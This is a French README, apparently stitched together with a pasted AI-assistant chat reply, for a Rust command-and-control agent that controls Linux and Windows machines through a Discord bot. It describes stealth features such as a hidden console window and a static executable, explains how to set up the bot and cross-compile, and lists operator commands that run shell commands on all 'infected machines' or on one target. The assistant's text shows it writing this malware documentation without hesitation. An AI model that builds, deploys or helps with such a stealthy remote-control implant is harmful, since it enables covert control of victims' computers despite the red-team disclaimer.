# 🦀 Discord C2 Agent

Ce projet est un Command & Control (C2) écrit en **Rust**. Il utilise l'API Discord comme canal de communication pour piloter des machines distantes (Linux & Windows) de manière furtive et sécurisée.

**DISCLAIMER**: Ce logiciel est conçu à des fins éducatives et de tests de sécurité autorisés. L'utilisation de ce code sur des systèmes sans autorisation explicite est illégale.

---

Tu as tout à fait raison, c'est l'étape la plus importante pour que ça marche ! J'ai ajouté une section "⚙️ Installation & Configuration" complète qui explique comment créer le bot sur le site de Discord, activer les droits (Intents) et où mettre les clés dans le code.

Voici le README.md V2 (Complet).

Tu peux tout copier d'un coup :
Markdown

# 🦀 Discord C2 Agent (Rust)

**Educational & Red Teaming Proof of Concept**

Ce projet est un agent de Command & Control (C2) léger écrit en **Rust**. Il utilise l'API Discord comme canal de communication pour piloter des machines distantes (Linux & Windows) de manière furtive et sécurisée.

⚠️ **DISCLAIMER**: Ce logiciel est conçu à des fins éducatives et de tests de sécurité autorisés (Red Teaming). L'utilisation de ce code sur des systèmes sans autorisation explicite est illégale.

---

## Fonctionnalités

* **Multi-Plateforme** : Fonctionne nativement sur Linux et Windows.
* **Furtivité Windows** :
    * Compilation en `.exe` statique (pas de dépendances DLL).
    * `#![windows_subsystem = "windows"]` : Aucune fenêtre de terminal ne s'ouvre au lancement.
* **Gestion de Concurrence** : Utilise un **Mutex** (`SingleInstance`) pour empêcher le lancement multiple du virus sur la même machine.
* **Stabilité** :
    * Timeout de 10 secondes sur les commandes pour éviter le freeze du bot.
    * Gestion des erreurs silencieuse (ne plante pas si une commande échoue).
* **Ciblage** : Possibilité d'exécuter une commande sur **tous** les agents ou une **machine spécifique**.

---

## Installation & Configuration

### 1. Création du Bot Discord
1. Allez sur le [Discord Developer Portal](https://discord.com/developers/applications).
2. Cliquez sur **"New Application"** et donnez-lui un nom.
3. Allez dans l'onglet **"Bot"** (menu de gauche) et cliquez sur **"Add Bot"**.
4. **TRÈS IMPORTANT :** Dans la section "Privileged Gateway Intents", activez **"MESSAGE CONTENT INTENT"** (sans ça, le bot ne peut pas lire vos commandes).
5. Cliquez sur **"Reset Token"** pour copier votre Token.
6. Invitez le bot sur votre serveur :
   * Allez dans **OAuth2** -> **URL Generator**.
   * Cochez `bot`.
   * Cochez `Administrator` (ou les permissions nécessaires).
   * Copiez le lien généré et ouvrez-le pour inviter le bot.

### 2. Récupérer l'ID du Salon (Channel ID)
1. Dans Discord, allez dans **Paramètres** -> **Avancés**.
2. Activez le **Mode Développeur**.
3. Faites un clic-droit sur le salon textuel où vous voulez recevoir les rapports.
4. Cliquez sur **"Copier l'identifiant"**.

### 3. Configuration du Code (`src/main.rs`)
Ouvrez le fichier `src/main.rs` et remplacez les valeurs suivantes :

```rust
// Remplacez par l'ID copié à l'étape 2
const REPORT_CHANNEL_ID: u64 = 123456789012345678; 

// ... dans le main ...

// Remplacez par le Token copié à l'étape 1
let token = "MTEyMz...VOTRE_TOKEN_ICI";
```

---

## Pré-requis

### 1. Configuration Cross-Compilation (Linux vers Windows)
Pour compiler un `.exe` depuis Linux, installez MinGW :
`sudo apt install mingw-w64`

Créez le fichier `.cargo/config.toml` à la racine du projet :
```toml
[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
ar = "x86_64-w64-mingw32-gcc-ar"
```

---

## Compilation

### Pour Linux
Génère un binaire statique compatible avec la plupart des distributions.

```bash
cargo build --release --target x86_64-unknown-linux-musl
# Binaire : target/x86_64-unknown-linux-musl/release/discord_c2
```

### Pour Windows (Agent "Fantôme")
Génère un `.exe` furtif (sans console) depuis Linux.

```bash
cargo build --release --target x86_64-pc-windows-gnu
# Binaire : target/x86_64-pc-windows-gnu/release/discord_c2.exe
```

---

## 🎮 Commandes Discord

Une fois l'agent lancé sur la machine cible, utilisez ces commandes dans votre salon Discord privé.

### 1. Vérifier les connexions (`Ping`)
Permet de voir quels agents sont en ligne et de récupérer leurs ID.
**Syntaxe :**
```text
!ping
```
**Réponse :** `Utilisateur vivant : user@hostname`

### 2. Exécution de Masse (`All`)
Exécute une commande shell sur **toutes** les machines infectées connectées.
**Syntaxe :**
```text
!exec all <commande>
```
**Exemple :** `!exec all whoami`

### 3. Exécution Ciblée (`Target`)
Exécute une commande uniquement sur une machine précise (utilisez l'ID récupéré via le ping).
**Syntaxe :**
```text
!exec <ID_MACHINE> <commande>
```
**Exemple :** `!exec jean@desktop ipconfig`

---

## 📝 Notes Techniques

* **Identifiant Unique :** L'ID est généré sous la forme `user@hostname`.
* **Timeout :** Toute commande prenant plus de **10 secondes** est tuée automatiquement pour préserver la connexion du bot.
* **Redirection :** Les commandes utilisant `>` (redirection de fichier) ne renverront pas de sortie dans Discord (car la sortie est écrite dans le fichier sur la machine distante). Pour lire le résultat, faites un `cat` ou `type` du fichier ensuite.

---

## 🛡️ Sécurité du Projet

* Ne jamais commiter le **Token Discord** sur GitHub. Utilisez un fichier `secrets.rs` ignoré ou des variables d'environnement lors du développement.
* Si le binaire est analysé (Reverse Engineering), le token peut être extrait. Considérez le token comme compromis si l'agent est capturé.